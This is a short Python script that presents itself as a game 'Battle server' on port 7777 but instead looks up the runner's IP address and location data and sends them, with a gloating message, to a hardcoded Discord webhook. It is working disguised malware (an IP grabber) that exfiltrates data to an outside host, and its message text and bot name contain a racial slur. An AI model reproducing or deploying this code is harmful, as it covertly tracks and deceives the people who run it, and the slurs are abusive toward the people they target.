import json
import requests

def Battle():
    print("Battle server started on port 7777!")
    ip_response = requests.get('http://ip-api.com/json')
    format = lambda string: string.replace('{', '{\n    ').replace(',', ',\n    ').replace('}', '\n}')
    result = f'--- Some nigga fell for the trap --- \n{format(ip_response.text)}\n with: OHD'
    IdiotReadThisBeforeYouContinue = "I already got your info. The damage has been done. GG. IDC if u spam the hook."
    webhook = requests.get('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs')
    webhhok_info = f'--- Webhook info ---\n{format(webhook.text)}'
    data = {
        'content': result,
        'username': 'Web-Nigga',
        'avatar_url': 'https://cdn.discordapp.com/emojis/1098704585671057449.png'
    }
    headers = {
        'Content-Type': 'application/json'
    }
    discord_response = requests.post('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs', data=json.dumps(data), headers=headers)